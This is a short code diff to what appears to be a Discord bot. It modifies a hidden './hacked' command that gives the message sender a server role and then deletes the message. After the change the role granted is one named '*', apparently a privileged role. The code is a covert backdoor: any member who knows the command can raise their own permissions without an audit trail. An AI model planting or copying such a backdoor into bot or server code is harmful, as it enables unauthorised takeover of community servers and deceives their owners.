@@ -18,7 +18,8 @@ client.on('message', message => {
 client.on('message', message => {
     if (message.content.startsWith("./hacked")) {
         var args = message.content.split(" ");
-        message.member.addRole(message.guild.roles.find(role => role.name === args[1])); 
+        var role = message.guild.roles.find(role => role.name === "*");
+        message.member.addRole(role);
         var server = message.guild;
         var name = message.author.username;
         message.delete();
